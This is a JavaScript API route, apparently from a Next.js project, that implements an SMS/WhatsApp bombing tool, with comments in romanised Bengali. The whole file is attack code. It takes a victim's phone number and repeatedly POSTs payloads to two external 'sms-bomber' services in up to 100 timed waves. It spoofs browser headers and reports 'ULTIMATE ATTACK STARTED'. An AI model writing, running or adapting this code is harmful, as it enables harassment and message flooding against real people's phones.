// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const { number, amount, isUltimate } = req.body;

  const targetLinks = [
    'https://shadowx-sms-bomber.onrender.com/',
    'https://nuke-sms-bomber.pages.dev/'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 100 : amount; 
    const delay = isUltimate ? 500 : 2000; 

    for (let i = 0; i < totalWaves; i++) {
      const attackPromises = targetLinks.map(async (link) => {
        try {
          // Amra ekhane ekta "Payload Array" use korchi
          // Mane ekta variable er bodole onno name try korbo
          const payload = {
            number: number,
            phone: number,
            target: number,
            mobile: number,
            amount: 1,
            count: 1,
            country: "BD",
            service: "whatsapp",
            msg: "Ultimate Attack",
            token: "true"
          };

          const response = await fetch(link, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json, text/plain, */*',
              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
              'X-Requested-With': 'XMLHttpRequest',
              'Origin': link,
              'Referer': link,
            },
            body: JSON.stringify(payload),
          });

          const result = await response.text();
          console.log(`[Wave ${i}] Link: ${link} | Status: ${response.status}`);

        } catch (err) {
          console.error(`[Wave ${i}] Error: ${err.message}`);
        }
      });

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK STARTED! 🔥" 
  });
}
